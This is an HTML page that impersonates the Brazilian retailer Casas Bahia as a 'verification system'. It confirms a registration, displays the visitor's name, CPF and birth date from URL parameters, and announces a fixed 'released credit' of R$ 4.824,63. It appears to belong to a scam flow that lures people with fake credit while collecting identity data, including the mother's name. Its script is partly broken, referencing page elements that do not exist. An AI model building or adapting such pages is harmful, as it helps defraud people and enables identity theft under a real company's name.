<html lang="pt-BR" data-lt-installed="true"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sistema de Verificação - Casas Bahia</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
    }

    body {
        background-color: #fff;
        display: flex;
        justify-content: center;
        padding: 0 1rem;
    }

    .container {
        max-width: 400px;
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .logo {
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .logo img {
        max-width: 6rem;
        height: auto;
        display: block;
    }

    .separator {
        border: none;
        border-top: 2px solid #0d64fb;
        width: 100%;
        margin: 1rem 0;
    }

    .main-card {
        font-size: 14px;
        background-color: #f4f4f4;
        padding: 1rem;
        margin-bottom: 1rem;
        width: 100%;
        text-align: center;
        border-radius: 6px;
        line-height: 1.4rem;
    }

    .info-card {
        background-color: #f4f4f4;
        padding: .75rem 1rem;
        margin-bottom: .5rem;
        width: 100%;
        border-radius: 6px;
    }

    .info-card-title {
        font-size: .9rem;
        color: #333;
        margin-bottom: .25rem;
        font-weight: lighter;
    }

    .info-card-value {
        font-size: 1rem;
        color: #333;
        font-weight: bold;
    }

    .footer-text {
        text-align: center;
        color: #333;
        font-size: 1rem;
        line-height: 1.3rem;
    }
</style>
</head>
<body class="vsc-initialized">
  <div class="container">
    <div class="logo">
      <img src="./images/Casas_Bahia_logo.svg" alt="Logo" style="max-width: 8rem; margin: 1rem auto; display: block;">
    </div>
    
    <hr class="separator">

    <div class="main-card">
      Seu cadastro foi confirmado com sucesso!
      Confira abaixo as informações cadastradas.
    </div>

    <!-- Infos -->
    <div class="info-card">
      <div class="info-card-title">Nome completo</div>
      <div class="info-card-value" id="fullNameValue">{{nome}}</div>
    </div>

    <div class="info-card">
      <div class="info-card-title">CPF</div>
      <div class="info-card-value" id="cpfValue"></div>
    </div>

    <div class="info-card">
      <div class="info-card-title">Data de Nascimento</div>
      <div class="info-card-value" id="birthDateValue">{{nascimento}}</div>
    </div>
    
    <div class="info-card">
      <div class="info-card-title">Crédito liberado</div>
      <div class="info-card-value">R$ 4.824,63</div>
    </div>

    <hr class="separator">

    <div class="footer-text">
      Sistema de Verificação - Casas Bahia<br>
    </div>
  </div>

  <script>
    // Função para formatar CPF
    function formatCPF(cpf) {
      // Remove qualquer formatação existente
      cpf = cpf.replace(/\D/g, '');
      
      // Verifica se tem 11 dígitos
      if (cpf.length !== 11) {
        return cpf; // Retorna como está se não tiver 11 dígitos
      }
      
      // Aplica a formatação padrão: 000.000.000-00
      return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    }

    // Função para verificar se a imagem existe

    const params = new URLSearchParams(window.location.search);
    const fullNameValue = params.get('name') || '';
    let cpfValue = params.get('cpf') || '';
    const birthDateValue = params.get('birthDate') || '';
    const motherNameValue = params.get('motherName') || '';
    const stateValue = params.get('state') || 'Santa Catarina';
    
    // Formata o CPF se necessário
    cpfValue = formatCPF(cpfValue);
    
    document.getElementById('fullNameValue').textContent = fullNameValue;
    document.getElementById('cpfValue').textContent = cpfValue;
    document.getElementById('birthDateValue').textContent = birthDateValue;
    document.getElementById('motherNameValue').textContent = motherNameValue;
    document.getElementById('stateValue').textContent = stateValue;
    
  </script>

</body></html>
